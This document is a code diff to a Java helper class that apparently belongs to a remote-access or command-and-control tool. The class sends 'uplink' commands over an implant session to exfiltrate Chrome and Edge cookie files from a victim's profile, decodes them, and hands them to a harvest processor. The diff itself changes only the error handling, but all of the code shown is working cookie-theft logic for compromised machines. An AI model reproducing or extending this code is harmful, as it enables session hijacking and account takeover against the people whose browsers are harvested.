@@ -116,11 +116,14 @@ public class CookiesCommandHelper {
 		String uplinkChrome = "uplink " + CHROME_COOKIES_FILENAME.replace("%APPDATA%", appdataDir).replaceAll("\"", "");
 		outcome.addSentCommand(uplinkChrome);
 		io.sendCommand(sessionId, uplinkChrome);
-		byte[] chromeCookies = getUplinkedFileFromIO(io, sessionId);
-		if(chromeCookies != null) {
+		try {
+			byte[] chromeCookies = getUplinkedFileFromIO(io, sessionId);
 			harvestProcessor.receiveChromeCookies(hostname, username, chromeCookies);
 			outcome.addMacroMessage("Captured Chrome Cookies");
+		}catch(Exception ex) {
+			//Proceed
 		}
+		
 		
 		
 		//Firefox
@@ -158,16 +161,18 @@ public class CookiesCommandHelper {
 		String uplinkEdge = "uplink " + EDGE_CHROMIUM_FILENAME.replace("%APPDATA%", appdataDir).replaceAll("\"", "");
 		outcome.addSentCommand(uplinkEdge);
 		io.sendCommand(sessionId, uplinkEdge);
+		try {
 		byte[] edgeCookies = getUplinkedFileFromIO(io, sessionId);
-		if(edgeCookies != null) {
 			harvestProcessor.receiveEdgeCookies(hostname, username, edgeCookies);
 			outcome.addMacroMessage("Captured Edge Cookies");
+		}catch(Exception ex) {
+			//proceed
 		}
 		
 		return outcome;
 	}
 	
-	private static byte[] getUplinkedFileFromIO(IOManager io, int sessionId) {
+	private static byte[] getUplinkedFileFromIO(IOManager io, int sessionId) throws Exception{
 		//Reference uplink syntax:
 		//<control> uplinked test_uplink VGhpcyBpcyBhIHRlc3QgZmlsZSB0byB1cGxpbmsgb24gTGludXguIEl0IGhhcyBubyBwb2ludC4K
 		
@@ -188,8 +193,10 @@ public class CookiesCommandHelper {
 			String scrubbedB64 = dirResponse.substring(dirResponse.lastIndexOf(" ") + 1);
 					//elements[3].replaceAll("\n", "").replaceAll("\r", "");
 			return Base64.getDecoder().decode(scrubbedB64);
+		}else {
+			throw new Exception("Unable to parse file");
 		}
-		return null;
+		
 	}
 	
 	public static FolderInfo getFirefoxProfileName(IOManager io, int sessionId, MacroOutcome outcome) throws Exception {
